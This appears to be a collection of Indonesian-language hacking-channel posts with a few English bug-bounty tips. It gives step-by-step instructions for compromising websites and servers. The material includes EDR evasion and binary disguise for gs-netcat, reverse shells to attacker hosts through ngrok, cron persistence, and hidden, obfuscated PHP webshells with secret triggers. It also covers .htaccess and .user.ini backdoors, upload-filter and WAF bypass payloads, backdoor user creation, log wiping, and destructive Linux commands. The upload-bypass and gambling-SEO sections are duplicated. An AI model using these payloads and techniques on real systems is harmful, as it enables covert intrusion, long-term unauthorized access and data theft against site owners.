Lanjut lekk kita setup real-world untuk bypass EDR + conceal binary saat menggunakan gs-netcat
atau reverse shell binary lain dalam post exploitation

Permasalahan Umum

🔸 EDR mendeteksi pola reverse shell & known malicious binary (hash, behavior).
🔸 Banyak EDR memblokir:

Suspicious network connection (outbound unusual TCP).

Unusual binary execution from temp folders.

Known binaries (gs-netcat, nc, socat, mimikatz, dll).

Strategi Bypass EDR

✅ A. Obfuscate & Rename Binary

Rename binary ke nama trust:

mv gs-netcat /usr/bin/ld-linux-x86-64.so.2

Strip debug symbols:

strip gs-netcat

Tambahkan padding agar hash berubah:

dd if=/dev/zero bs=1 count=1000 >> gs-netcat

Optional: Pack dengan upx:

upx --ultra-brute gs-netcat

Hasil: Signature dan hash berbeda dari default public gs-netcat.


✅ B. Execute via Trusted Process

Jalankan shell dari:

bash -c "gs-netcat ..."
Scripting yang sudah trusted (python, perl).
WMI atau PowerShell jika di Windows.

Misal persistence:

echo "@reboot /usr/bin/ld-linux-x86-64.so.2 -c -s secret -i" | crontab -


✅ C. Hide on Disk

Tempatkan binary di:

/usr/lib/systemd/
/usr/local/share/man/
/var/tmp/.cache/
/dev/shm/.sys/

Rename ke nama yang terlihat valid (systemd-udevd, dbus-daemon).


✅ D. Use LD_PRELOAD or Process Injection (Advanced)

Untuk fully stealth, bisa:

Compile loader yang melakukan process hollowing / injection ke process trusted (misal sshd, systemd).
Menggunakan LD_PRELOAD untuk hook libc connect, read, write agar terhubung ke handler kelen tanpa membuat child suspicious.

✅ E. Network Evasion

Gunakan domain fronting atau TLS dengan SNI domain trusted.
Jalankan connection ke port 443 agar terlihat seperti HTTPS.
Jika menggunakan gs-netcat, setup relay server agar berjalan di port 443 dan subdomain mirip CDN.

Cara Setup Ngrok / FRP / Gsocket untuk Reverse Shell

Install Ngrok:

wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
unzip ngrok-stable-linux-amd64.zip
./ngrok authtoken <your_token>

Jalankan listener di local:

nc -lvnp 4444

Jalankan ngrok:

./ngrok tcp 4444


Ngrok akan ngasih kelen URL seperti tcp://0.tcp.ap.ngrok.io:12345, nah kelen bisa gunakan IP:PORT ini pada reverse shell payload:

bash -i >& /dev/tcp/0.tcp.ap.ngrok.io/12345 0>&1

atau

nc 0.tcp.ap.ngrok.io 12345 -e /bin/bash


FRP (Fast Reverse Proxy)
✅ Lebih stabil untuk pivoting dan bypass NAT
✅ Perlu VPS sebagai server

Alur:

VPS menjalankan frps (server)
Target menjalankan frpc (client) untuk reverse shell

Note : Untuk Config FRP  ready-to-use nnti ku share terpisah, ditunggu aja

Gsocket

✅ Cocok untuk persistent encrypted reverse shell
✅ Auto NAT traversal
✅ Traffic terenkripsi

Basic install:

bash -c "$(curl -fsSL https://gsocket.io/y)" 


Server (VPS):

gs-netcat -l -s <your_secret>


Target:

gs-netcat -c -s <your_secret> -i

Setelah connect, kelen udah bisa dapat interactive shell encrypted tanpa perlu buka port manual.

Note: Kalau mau setup untuk bypass EDR + conceal binary, bisa kita lanjutkan sesi Gsocket setelah ini.

Tips Shibal Sekiya 👁

Teknik Mempertahankan Akses dengan Cron Jobs

Goal: Setelah dapat shell, kelen buat reverse shell autopersist pada target agar saat reboot masih reconnect ke kelen.

Contoh cron:

echo "* * * * * bash -i >& /dev/tcp/attacker_ip/port 0>&1" >> /var/spool/cron/root

Artinya setiap menit akan melakukan reverse shell ke IP kelen.

Tips:

Encode agar stealth:

echo "* * * * * bash -c 'bash -i >& /dev/tcp/attacker_ip/port 0>&1'" | crontab -

Gunakan nama script yang terlihat “normal” misal /usr/bin/sysd atau /usr/local/bin/update dan panggil dari cron.

Jika user bukan root, gunakan crontab -e pada user tersebut untuk persist akses.


SSH Tunneling untuk Pivoting Ringan

Goal: Setelah dapat user shell pada server target, kita ingin akses internal network target via SSH.

Misal: 
Target = user@192.168.0.10
Internal service di 192.168.0.20:3306 (MySQL) kelen akses dari lokal.

kelen jalankan dari lokal:

ssh -L 13306:192.168.0.20:3306 user@192.168.0.10

Artinya:

Port 13306 di lokal akan forward ke 192.168.0.20:3306 melalui server target

nah kelen bisa akses:

mysql -h 127.0.0.1 -P 13306 -u root -p

untuk baca database internal.

🌐 𝙅𝙖𝙫𝙖𝙎𝙘𝙧𝙞𝙥𝙩 𝙀𝙣𝙪𝙢𝙚𝙧𝙖𝙩𝙞𝙤𝙣 𝙁𝙤𝙧 𝘽𝙪𝙜 𝘽𝙤𝙪𝙣𝙩𝙮 𝙃𝙪𝙣𝙩𝙚𝙧𝙨! 🚀

🔍 Find JS Files, Extract API Keys, Secrets, Endpoints & More…

💡 𝗪𝗵𝘆 𝗝𝗮𝘃𝗮𝗦𝗰𝗿𝗶𝗽𝘁 𝗘𝗻𝘂𝗺𝗲𝗿𝗮𝘁𝗶𝗼𝗻?
JavaScript files often contain juicy stuff — API keys, hidden endpoints, internal routes, and more. Smart recon = fast p1/p2 finds. Save this full recon pipeline and automate your success. 👇

🔧 𝟏️. 𝗔𝘂𝘁𝗼𝗺𝗮𝘁𝗲𝗱 𝗝𝗦 𝗙𝗶𝗹𝗲 𝗙𝗶𝗻𝗱𝗶𝗻𝗴 (CLI Tools)

📍 Using gau
𝚐𝚊𝚞 𝚝𝚊𝚛𝚐𝚎𝚝.𝚌𝚘𝚖 | 𝚐𝚛𝚎𝚙 ".𝚓𝚜" | 𝚝𝚎𝚎 𝚓𝚜_𝚏𝚒𝚕𝚎𝚜.𝚝𝚡𝚝

📍 Wayback Machine
𝚠𝚊𝚢𝚋𝚊𝚌𝚔𝚞𝚛𝚕𝚜 𝚝𝚊𝚛𝚐𝚎𝚝.𝚌𝚘𝚖 | 𝚐𝚛𝚎𝚙 ".𝚓𝚜" | 𝚝𝚎𝚎 𝚓𝚜_𝚠𝚊𝚢𝚋𝚊𝚌𝚔.𝚝𝚡𝚝

📍 Katana fast crawler
𝚔𝚊𝚝𝚊𝚗𝚊 -𝚞 𝚑𝚝𝚝𝚙𝚜://𝚝𝚊𝚛𝚐𝚎𝚝.𝚌𝚘𝚖 -𝚓𝚌 -𝚜𝚒𝚕𝚎𝚗𝚝 | 𝚝𝚎𝚎 𝚓𝚜_𝚔𝚊𝚝𝚊𝚗𝚊.𝚝𝚡𝚝

📍 Combining sources
𝚎𝚌𝚑𝚘 𝚝𝚊𝚛𝚐𝚎𝚝.𝚌𝚘𝚖 | 𝚜𝚞𝚋𝚏𝚒𝚗𝚍𝚎𝚛 | 𝚑𝚝𝚝𝚙𝚡 -𝚜𝚒𝚕𝚎𝚗𝚝 | 𝚐𝚊𝚞 | 𝚐𝚛𝚎𝚙 ".𝚓𝚜" | 𝚊𝚗𝚎𝚠 𝚊𝚕𝚕_𝚓𝚜.𝚝𝚡𝚝

📍 Extract from robots.txt
𝚌𝚞𝚛𝚕 -𝚜 𝚑𝚝𝚝𝚙𝚜://𝚝𝚊𝚛𝚐𝚎𝚝.𝚌𝚘𝚖/𝚛𝚘𝚋𝚘𝚝𝚜.𝚝𝚡𝚝 | 𝚐𝚛𝚎𝚙 ".𝚓𝚜" | 𝚊𝚠𝚔 '{𝚙𝚛𝚒𝚗𝚝 $𝙽𝙵}' | 𝚝𝚎𝚎 𝚓𝚜_𝚛𝚘𝚋𝚘𝚝𝚜.𝚝𝚡𝚝

🔎 𝗠𝗮𝗻𝘂𝗮𝗹 𝗠𝗲𝘁𝗵𝗼𝗱𝘀

✔ Ctrl + U → View Page Source
✔ F12 → Network Tab → Filter .js
✔ Burp Suite Spider or Crawler

📤 𝟐️. 𝗘𝘅𝘁𝗿𝗮𝗰𝘁 𝗘𝗻𝗱𝗽𝗼𝗶𝗻𝘁𝘀 & 𝗔𝗣𝗜 𝗞𝗲𝘆𝘀

🔍 LinkFinder
𝚌𝚊𝚝 𝚓𝚜_𝚏𝚒𝚕𝚎𝚜.𝚝𝚡𝚝 | 𝚡𝚊𝚛𝚐𝚜 -𝙸{} 𝚙𝚢𝚝𝚑𝚘𝚗3 ~/𝚝𝚘𝚘𝚕𝚜/𝙻𝚒𝚗𝚔𝙵𝚒𝚗𝚍𝚎𝚛/𝚕𝚒𝚗𝚔𝚏𝚒𝚗𝚍𝚎𝚛.𝚙𝚢 -𝚒 {} -𝚘 𝚌𝚕𝚒 | 𝚝𝚎𝚎 𝚎𝚗𝚍𝚙𝚘𝚒𝚗𝚝𝚜.𝚝𝚡𝚝

🔐 SecretFinder
𝚌𝚊𝚝 𝚓𝚜_𝚏𝚒𝚕𝚎𝚜.𝚝𝚡𝚝 | 𝚡𝚊𝚛𝚐𝚜 -𝙸{} 𝚙𝚢𝚝𝚑𝚘𝚗3 ~/𝚝𝚘𝚘𝚕𝚜/𝚂𝚎𝚌𝚛𝚎𝚝𝙵𝚒𝚗𝚍𝚎𝚛/𝚂𝚎𝚌𝚛𝚎𝚝𝙵𝚒𝚗𝚍𝚎𝚛.𝚙𝚢 -𝚒 {} -𝚘 𝚌𝚕𝚒 | 𝚝𝚎𝚎 𝚜𝚎𝚌𝚛𝚎𝚝𝚜.𝚝𝚡𝚝

🎯 gf patterns
𝚌𝚊𝚝 𝚓𝚜_𝚏𝚒𝚕𝚎𝚜.𝚝𝚡𝚝 | 𝚐𝚏 𝚊𝚙𝚒𝚔𝚎𝚢𝚜 | 𝚝𝚎𝚎 𝚊𝚙𝚒_𝚔𝚎𝚢𝚜.𝚝𝚡𝚝
𝚌𝚊𝚝 𝚓𝚜_𝚏𝚒𝚕𝚎𝚜.𝚝𝚡𝚝 | 𝚐𝚏 𝚊𝚠𝚜-𝚔𝚎𝚢𝚜 | 𝚝𝚎𝚎 𝚊𝚠𝚜_𝚔𝚎𝚢𝚜.𝚝𝚡𝚝
𝚌𝚊𝚝 𝚓𝚜_𝚏𝚒𝚕𝚎𝚜.𝚝𝚡𝚝 | 𝚐𝚏 𝚓𝚜𝚘𝚗 | 𝚝𝚎𝚎 𝚓𝚜𝚘𝚗_𝚕𝚎𝚊𝚔𝚜.𝚝𝚡𝚝
𝚌𝚊𝚝 𝚓𝚜_𝚏𝚒𝚕𝚎𝚜.𝚝𝚡𝚝 | 𝚐𝚏 𝚞𝚛𝚕𝚜 | 𝚝𝚎𝚎 𝚞𝚛𝚕𝚜.𝚝𝚡𝚝

🧠 Grep secrets manually
𝚐𝚛𝚎𝚙 -𝙴 -𝚘 "(𝚊𝚙𝚒𝙺𝚎𝚢|𝚊𝚞𝚝𝚑𝚃𝚘𝚔𝚎𝚗|𝚌𝚕𝚒𝚎𝚗𝚝_𝚜𝚎𝚌𝚛𝚎𝚝|𝚊𝚌𝚌𝚎𝚜𝚜𝚃𝚘𝚔𝚎𝚗)["'= ]+[^"' ]+" 𝚓𝚜_𝚏𝚒𝚕𝚎𝚜.𝚝𝚡𝚝 | 𝚝𝚎𝚎 𝚏𝚘𝚞𝚗𝚍_𝚔𝚎𝚢𝚜.𝚝𝚡𝚝

🔁 𝟯. 𝗖𝗵𝗮𝗶𝗻 𝗧𝗼𝗼𝗹𝘀 𝗧𝗼𝗴𝗲𝘁𝗵𝗲𝗿

🎯 Find JS + Endpoints
𝚐𝚊𝚞 𝚝𝚊𝚛𝚐𝚎𝚝.𝚌𝚘𝚖 | 𝚐𝚛𝚎𝚙 ".𝚓𝚜" | 𝚝𝚎𝚎 𝚓𝚜_𝚏𝚒𝚕𝚎𝚜.𝚝𝚡𝚝 && 𝚌𝚊𝚝 𝚓𝚜_𝚏𝚒𝚕𝚎𝚜.𝚝𝚡𝚝 | 𝚡𝚊𝚛𝚐𝚜 -𝙸{} 𝚙𝚢𝚝𝚑𝚘𝚗3 ~/𝚕𝚒𝚗𝚔𝚏𝚒𝚗𝚍𝚎𝚛.𝚙𝚢 -𝚒 {} -𝚘 𝚌𝚕𝚒 | 𝚝𝚎𝚎 𝚎𝚗𝚍𝚙𝚘𝚒𝚗𝚝𝚜.𝚝𝚡𝚝

🔑 Find JS + API keys
𝚐𝚊𝚞 𝚝𝚊𝚛𝚐𝚎𝚝.𝚌𝚘𝚖 | 𝚐𝚛𝚎𝚙 ".𝚓𝚜" | 𝚊𝚗𝚎𝚠 𝚓𝚜_𝚏𝚒𝚕𝚎𝚜.𝚝𝚡𝚝 && 𝚌𝚊𝚝 𝚓𝚜_𝚏𝚒𝚕𝚎𝚜.𝚝𝚡𝚝 | 𝚐𝚏 𝚊𝚙𝚒𝚔𝚎𝚢𝚜 | 𝚝𝚎𝚎 𝚊𝚙𝚒_𝚔𝚎𝚢𝚜.𝚝𝚡𝚝

#DEFFEND SHELL
menanam shell yang gak ketahuan & gak hilang walau website di-fix, tapi tetep bisa diakses diam-diam lek (kalau hoki) 

tujuan: 

gak kehapus waktu website di-restore
gak ketahuan hacker lain / admin
tetep bisa jadi jalan masuk kapan aja lek

MENYEMBUNYIKAN SHELL DI WEBSITE (TANPA TERDETEKSI)

tips: 

1. Rename File Shell Seperti File Legit
Contoh:

halo.php → analytics.php
shell.php → functions.php
cmd.php → jquery.backup.php

 bnyak admin males cek file satu per satu kalau nama dan ukuran mirip file asli.

2. Simpan Shell di Folder yang “Wajar”

misalnya : 

| Folder Target                | Alasan Aman                              |
| ---------------------------- | ---------------------------------------- |
| `/images/`, `/assets/img/`   | banyak gambar, gak diperiksa detail      |
| `/css/`, `/js/`              | jarang dikira tempat shell               |
| `/vendor/`, `/node_modules/` | ribuan file, bisa sembunyi               |
| `/uploads/`                  | folder umum upload file user             |
| `/storage/`, `/cache/`       | folder internal framework, gak diperiksa |

3. Gunakan Ekstensi Non-PHP + Backdoor Trigger

shell php dikamuflase:

file.php.jpg
index.php.txt
style.php.bak

trigger shell lewat parameter:

<?php
if(isset($_GET['x']) && $_GET['x'] == 'gacor1337') {
    system($_GET['cmd']);
}
?>

📌 jadi gak jalan kalau gak tau trigger-nya.

4. Sisipkan Shell di File Legit (Injection Mode)

Gabungkan shell ke file seperti:

<?php include("wp-settings.php"); ?>
<?php if(isset($_GET['a'])){eval($_GET['a']);} ?>

atau letak di functions.php, footer.php, atau index.php milik tema.

5. Gunakan Reverse Shell One-Liner via Webhook

shell kecil : 

<?php system("curl http://yourhost/cmd.txt | bash"); ?>

jadi payload dikontrol dari luar via file cmd.txt.

 6. Tanam Shell di .htaccess (Apache Only)

AddType application/x-httpd-php .jpg

biar file .jpg bisa diakses sebagai PHP.


7. Encode Shell agar Tidak Dikenali AV
Obfuscate shell:

<?php
eval(base64_decode('ZWNobyAnZ2Fjb3InOw=='));
?>

atau : 

 <?php $c="s"."y"."s"."t"."e"."m"; $c($_GET['cmd']); ?>

8. Tanam Cronjob Reverse Shell

kalau punya akses root/sudo:

echo "* * * * * www-data bash -i >& /dev/tcp/attackerip/4444 0>&1" >> /etc/crontab

shell hidup tiap menit, walau web udah dihapus

9. Backdoor di .user.ini (jika PHP-FPM aktif)

auto_prepend_file = "/path/to/.hidden/shell.php"

tips tambahan lekk 

| Taktik                                           | Tujuan                                              |
| ------------------------------------------------ | --------------------------------------------------- |
| ubah nama file jadi gak mencurigakan             | biar gak dicurigai                                  |
| buat trigger tersembunyi (`?auth=gacor&cmd=...`) | supaya gak jalan sembarangan                        |
| simpan shell di folder mirip core                | biar ketutup ribuan file lain                       |
| inject ke file sistem CMS                        | gak bakal dicurigai kalau gak dicek baris per baris |
| tambah `.htaccess` block IP                      | biar hanya IP tertentu yang bisa akses shell lo     |
NEXT UPDATE INFO GSOCKET YA LEK

Cara pakai Global Socket (gsocket) di dalam shell website
→ biar kelen dapet akses balik (reverse shell) yang aman, terenkripsi, dan nggak kena firewall/NAT

Apa itu Global Socket lek ?

jadi gini lek gsocket = tool reverse shell terenkripsi & stealth via relay server kayak TOR, tapi lebih gampang dan langsung connect peer-to-peer (P2P).

mirip SSH reverse shell tapi bisa tembus firewall dan NAT. ( kurang lebih seperti ini lah lek )

kita masuk ke vps kita dlu untuk install gsocket nya ya lek 

ssh root@ipserver kelen

lanjut ke : 

apt install gsocket

setelah udah ke install kita cek lg : 

gs-netcat -h

klo dah muncul berarti dah paten itu lek, berarti gsocket udah kepasang di server kita ya lek

kita lanjut cara deploy ke server target lek

jadi di shell itu ada yang namanya terminal kan lek, ente ke terminal lalu jalankan perintah ini lek 

GS_NOCERTCHECK=1 bash -c "$(curl -fsSLk https://gsocket.io/y)"

setelah kelen jalankan command yg ku kasih, itu nnti dia ada print di terminal, nah nnti yg kelen simpan ini lek

contoh akses : 

```gs-netcat -s "randomcode" -i```

https://www.gsocket.io/deploy/ ( dokumentasi lengkap disini lek bisa kelen baca" )

nah setelah kita dapat key dari si target, key nya lgsg kita akses aja lek ke vps kita yang udah terinstall gsocket

tinggal di paste 

``` gs-netcat -s "randomcode" -i ````

nnti lgsg masuk lek ke server web tersebut

Note : terkadang ada beberapa server(shell) yang gabisa di install gsocket

untuk info lebih lanjut, kalua ada pertanyaan bisa kesini aja lek 

Group Chat : https://t.me/+7oWBVb2JNno5YTQ1

kita sharing" disini ya lekku

info lekk 

TEST SERVER KELEN SUPPORT ATAU GAK
di shell/terminal VPS kelen, coba:

uname -a && ldd --version

kalau keluar info Linux & glibc versi >= 2.17 → aman bisa jalanin gs-netcat.

DAN UKURAN & KOMPATIBILITAS
ukuran binary gs-netcat cuma sekitar 1 MB
gak butuh dependency aneh-aneh
gak perlu install python, node, php, dll
bisa dijalanin dari lokasi mana aja (contoh: /tmp, /home, /images/)

Kalau Server Gak Bisa?
VPS/Shell kelen terlalu terbatas, alternatif:
gunakan reverse shell klasik: bash, nc, php, python
gunakan WebShell stealth: dengan trigger rahasia + cookie bypass
pakai gs-netcat versi statik build, aku bantu compile-in

sesi praktik eksploitasi otomatis dlu kita lek ⭐️

dari mulai ngintai sampe bisa nempel shell & numpang tinggal di server orang yagessya

STEP 1: RECON – ngintai dulu lek, Jangan Langsung main tebas
tujuannya: kita mau tau si target ini punya rumah di mana, alamat lengkapnya apa, dan pakai teknologi apa di dalemnya.

tools yg kita pake 
subfinder → untuk nyari anak-anak domainnya
httpx → ngecek hidup nggaknya domain
whatweb → tau dia pakai apa (WordPress kah? Laravel kah? Joomla kah?) bisa pakai wappalyzer extension yg ada di google
nmap → ngecek lobang port yang terbuka

perintahnya (ketik di terminal)

# cari subdomain dari target.go.id
subfinder -d target.go.id -o subs.txt

# cek mana yang hidup, sekalian liat title & teknologi
cat subs.txt | httpx -title -tech-detect -status-code -o live.txt

# scan port yang kebuka (kayak 80, 443, 21, 22)
nmap -Pn -sV -T4 -iL subs.txt -oN ports.txt

masuk ke tahap install tools kita ya lek 

1.install Golang dulu – untuk subfinder & httpx
karna 2 tools ini ditulis pakai Go (Golang), jadi wajib pasang Go dulu.

sudo apt update
sudo apt install golang -y

cek versi:

go version

kalau udah muncul misalnya:

go version go1.20.5 linux/amd64
berarti aman.

2. install Subfinder (nyari subdomain)

go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest

biar bisa dipanggil dari mana aja:

cp ~/go/bin/subfinder /usr/local/bin/
cek : 

subfinder -h

3. install HTTPX (cek domain hidup/mati + fingerprint)

go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
cp ~/go/bin/httpx /usr/local/bin/

tes: 

httpx -h

4. install WhatWeb (buat liat teknologi target)

sudo apt install ruby -y
sudo gem install whatweb

tes:

whatweb https://testphp.vulnweb.com

kalau keluar info misalnya: PHP, Apache, HTML5, Country: United States ➜ berarti dah paten itu lek

5. install Nmap (buat scan port terbuka)

sudo apt install nmap -y

cek:

nmap -v scanme.nmap.org

kalau semua udah keinstall lek, kita lanjut ke:

🕵️ Recon real → Export target aktif → Siap exploit otomatis

next teknik bypass 

Bypass Upload Filter (Shell Upload)
target punya validasi:
hanya izinkan .jpg, .png
case : blok .php

ubah ekstensi:

shell.php.jpg
shell.ph%00p
shell.phtml
shell.php;.jpg


gunakan MIME-type spoofing:

Content-Type: image/jpeg

rename payload jadi image:

<?php
/* fake jpg header */
echo "<!-- fake image -->";
eval($_GET['cmd']);
?>

rename magic byte:
gunakan Hex editor, taruh ini di awal file:

FFD8FFE0  (JPEG Header)

upload via burpsuite dan modifikasi request:

POST /upload HTTP/1.1
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

ada yang nanyaa apa itu GKR , jadi gini lekk golden keyword ratio yang di singkat GKR

itu teknik untuk nyari kata kunci ( keyword ) yang ga banyak saingannya, tapi masih ada orang yang nyari di google lek

biar apa ? 

 biar web kelen cepat naik ke page 1 di google la pantek, walaupun site kita fresh, ga ada traffic, busuk, miskin backlink tapi tetap mampu untuk naik ke page 1 nya si google lek

jd cemana lek cara mainkannya itu ? 

kelen pake rumus ini aja lek : 

GKR = jumlah artikel yang punya judul persis keyword itu / jumlah orang yang nyari keyword itu

berapa banyak orang yang udah pake keyword itu di judul artikel mereka dibagi berapa banyak orang yang nyari keyword itu di google.

contoh ni biar kelen makin paham yakan :

misal kw : "situs gacor tanpa deposit"
orang yang cari sebulan ada : 100 orang
tapi pas kita cek di google pakai : "allintitle:"situs gacor tanpa deposit" hasilnya cuma 10 artikel

berarti : 

GKR = 10 / 100 = 0.1

nah, angka segitu udah gacor kali lekkk

karna kan GKR dibawah 0.25 itu artinya kw itu kayak emas murni 24 karat la istitlahnya
sedikit saingan tapi tetap di carikk sama orang lek

next nnti ku share skala GKR yg paten itu kekmana

next teknik bypass 

Bypass Upload Filter (Shell Upload)
target punya validasi:
hanya izinkan .jpg, .png
case : blok .php

ubah ekstensi:

shell.php.jpg
shell.ph%00p
shell.phtml
shell.php;.jpg


gunakan MIME-type spoofing:

Content-Type: image/jpeg

rename payload jadi image:

<?php
/* fake jpg header */
echo "<!-- fake image -->";
eval($_GET['cmd']);
?>

rename magic byte:
gunakan Hex editor, taruh ini di awal file:

FFD8FFE0  (JPEG Header)

upload via burpsuite dan modifikasi request:

POST /upload HTTP/1.1
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

ada yang nanyaa apa itu GKR , jadi gini lekk golden keyword ratio yang di singkat GKR

itu teknik untuk nyari kata kunci ( keyword ) yang ga banyak saingannya, tapi masih ada orang yang nyari di google lek

biar apa ? 

 biar web kelen cepat naik ke page 1 di google la pantek, walaupun site kita fresh, ga ada traffic, busuk, miskin backlink tapi tetap mampu untuk naik ke page 1 nya si google lek

jd cemana lek cara mainkannya itu ? 

kelen pake rumus ini aja lek : 

GKR = jumlah artikel yang punya judul persis keyword itu / jumlah orang yang nyari keyword itu

berapa banyak orang yang udah pake keyword itu di judul artikel mereka dibagi berapa banyak orang yang nyari keyword itu di google.

contoh ni biar kelen makin paham yakan :

misal kw : "situs gacor tanpa deposit"
orang yang cari sebulan ada : 100 orang
tapi pas kita cek di google pakai : "allintitle:"situs gacor tanpa deposit" hasilnya cuma 10 artikel

berarti : 

GKR = 10 / 100 = 0.1

nah, angka segitu udah gacor kali lekkk

karna kan GKR dibawah 0.25 itu artinya kw itu kayak emas murni 24 karat la istitlahnya
sedikit saingan tapi tetap di carikk sama orang lek

next nnti ku share skala GKR yg paten itu kekmana

kemarin ada yang nanya cara ngakalin WAF
ada beberapa teknik sih yang bisa di coba

tips Bypass:
ubah user-agent, content-type

encode payload (URL encode, double encode, hex)

gunakan header aneh: X-Original-URL, X-Forwarded-For

gunakan IP range yang trust (via proxy/VPS)

contohni : 

curl -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" https://target.com

Bypass Keyword Filtering (Command / SQL / XSS)

Case : kelen mau inject UNION SELECT tapi terkena block WAF kayak gini 

403 Forbidden – Your request looks suspicious

teknik bypass:

1 .Obfuscate SQL keywords 

UNI/**/ON SEL/**/ECT
UNION%0ASELECT
UNI%0bON%0dSELECT
UNION/*!00000SELECT*/

2. Gunakan encoding
%27 → '
%3Cscript%3Ealert(1)%3C/script%3E → <script>alert(1)</script>

3. Inline comment:

' UNION/**/SELECT/**/1,2,3--+

4. Gunakan casing:

UnIoN SeLeCt

5. Padding string:

UNION SELECT 'a'+'b'

Bypass WAF (Cloudflare, Sucuri, ModSecurity)

target terproteksi WAF biasanya:
error muncul dengan ID (403 + ID request)
ada CAPTCHA / JS challenge

teknik : 

spoof headers:

curl -H "X-Forwarded-For: 127.0.0.1" \
     -H "X-Original-URL: /admin" \
     -H "X-Host: target.com" \
     https://target.com

user-agent ganti:

curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" ...

gunakan HTTP verb yang jarang:

curl -X HEAD https://target.com
curl -X OPTIONS https://target.com

run lewat tor/proxy : 

proxychains curl -A "..." https://target.com

 IP Geo-lokasi trusted (indonesia/US Residential IP)
padding query:

?id=1%2527%2520UNION%2520SELECT...

DAY 6

📌 6. PERSISTENCE & CLEARING TRACE
Tujuan: Tetap masuk + bersih jejak

Teknik :
Buat user baru (useradd shibalsekiya && echo shibalsekiya | passwd sayangkamu)
Tambah SSH key di authorized_keys
Inject crontab untuk reverse shell

Bersihin log:

echo "" > ~/.bash_history  
> /var/log/apache2/access.log

Tips Shibal Sekiya 👁

📌 7. BONUS: AUTOMATION TOOLS
Kalau kelen mau auto exploit kelen bisa pakai ini 
Tools all in one 

AutoRecon ( https://github.com/Tib3rius/AutoRecon )
Sn1per (https://github.com/1N3/Sn1per)
LinPEAS ( https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS )
LinEnum ( https://github.com/rebootuser/LinEnum )
YutaExploit ( https://github.com/yutasato88/YutaExploit ) 
Auto Complate Tools ( https://github.com/yutasato88/Auto-Complate-Tools )

💡 Tips Akhir Dariku 
Selalu uji dulu di lab, jangan langsung ke target publik kalau belum yakin 100%
Gabungkan automation + manual testing biar maksimal
Pahami teknik bypass WAF/Firewall
Selalu obfuscate payload, variasikan User-Agent & IP

Kalau Ada Kendala Bisa Sharing" disini 
 👁 Nexarium Group - Only Public : https://t.me/+SfN6YXOTwCgyNDY1

DAY 4 

📌 4. EXPLOITATION (EKSEKUSI CELAH)
Tujuan: Eksekusi celah untuk dapat akses awal

Free tools
sqlmap → dump DB, login info
exploit.py, msfconsole, atau exploit manual
curl -F "upload=@shell.php" target.com/upload.php
Payload Obfuscation: Gunakan php://filter, base64, null byte, bypass MIME, content-type tricks
LFI to RCE: /index.php?page=../../../../../../../var/log/apache2/access.log
XSS ke cookie hijack / admin access

Tips Shibal Sekiya 👁

DAY 3 

📌 3. VULNERABILITY ANALYSIS
Tujuan: Identifikasi celah keamanan


Langkah:
Cek CVE berdasarkan service pakai searchsploit, exploit-db, atau VulnHub

Jalankan scanner:

nuclei -t cves/

wpscan, joomscan, drupwn

sqlmap, xray, xsstrike, burpsuite

Cek misconfig: Exposed panel, default creds, error message detail

Fokus:
SQL Injection
LFI/RFI
XSS
Command Injection
Unrestricted File Upload
SSRF
Path Traversal
Deserialization bugs
Misconfigured cloud (S3, GCP, Azure)

Tips Shibal Sekiya  👁

DAY 2

📌 2. SCANNING (PEMETAAN SISTEM)
Tujuan: Cari port terbuka, layanan aktif, dan potensi celah.

Free Tools
nmap -sC -sV -Pn target.com → Check port & versi service
masscan → Fast Scan
nikto, dirsearch, ffuf → look for direktori/hidden file
whatweb, nuclei → Deteksi CMS & vuln template
httpx, httprobe → Validasi subdomain
shcheck, sslscan, testssl.sh → Cek kelemahan SSL

Output:
Port terbuka (80, 443, 21, 22, 3306, dll)
Layanan yang bisa di-exploit
File sensitif (.env, config.php, .git, dsb)

Tips Shibal Sekiya 👁

DAY ONE

📌 1. RECONNAISSANCE
Tujuan: Kumpulin semua info target selengkap mungkin.

Free Tools
whois, nslookup, dig → Get Info Domain & DNS
shodan, censys, zoomeye, nmap → Get service & Open Port
crt.sh, subfinder, amass, assetfinder → Get Subdomain

Google Dork:
site:target.com inurl:admin  
intitle:index.of "backup"

Output:
IP & domain
Subdomain valid
Email staf

u can check site with extension ( https://chromewebstore.google.com/detail/wappalyzer-technology-pro/gppongmhjkpfnbhagpmjfkannfbllamg?hl=id )
untuk cek teknologi apa yg di pakai pada web tersebut.

XSS Reflected vulnerable.


1. site:*.target.com ext:php
2. echo sub.target.com | waybckurls | grep "\?" | uro | httpx -silent > parameters.txt  
3. nuclei -l parameters.txt -t fuzzing-templates 
4. You may find xss,sqli,ssrf,open redirect...ext

#TIPS

*Top 10 Deadly Linux Commands You Should Never Run (Unless You Want Chaos)* 😉

1. rm -rf /
Deletes everything from the root directory without warning.
Result: Total system wipe.



2. :(){ :|:& };: (Fork Bomb)
Creates infinite processes to crash your system.
Result: System freeze or crash.




3. mkfs.ext4 /dev/sdX
Formats the given disk.
Result: Complete data loss.



4. dd if=/dev/zero of=/dev/sdX
Overwrites the disk with zeros.
Result: Irrecoverable data wipe.



5. chmod -R 000 / or chmod -R 777 /
Changes permissions for all files.
Result: System becomes unusable or insecure.



6. mv / /dev/null
Moves your entire root directory into nothingness.
Result: Say goodbye to your OS.




7. >/dev/sda
Overwrites the boot sector.
Result: System won't boot.



8. yes > /dev/sda
Fills your disk with infinite "yes".
Result: Disk corruption.




9. find / -name "important_file" -exec rm -rf {} \;
Deletes every file named "important_file".
Result: Selective, but permanent deletion.




10. wget http://malicious-url.com -O- | sh
Downloads and runs a script from the internet.
Result: Malware attack.


Note:
*These are for educational purposes only. Run at your own risk (or better, don’t).*

Password Reset Bypass Trick 🌀

Some poorly secured endpoints accept multiple email parameters.😳

Try this:

POST /passwordReset HTTP/1.1  
Content-Type: application/x-www-form-urlencoded  

email=victim@example.com&email=hacker@example.com

Or in JSON:

{
  "email": ["victim@example.com", "attacker@example.com"]
}

If the app sends the reset link to both emails… you’re in.⚡️
Now imagine if the victim is an admin — hello dashboard, hello bounty!💰

#bugbountytips

⚡️Google Dorks - Vulnerable Parameters ⚡️


⛔️XSS prone parameters:

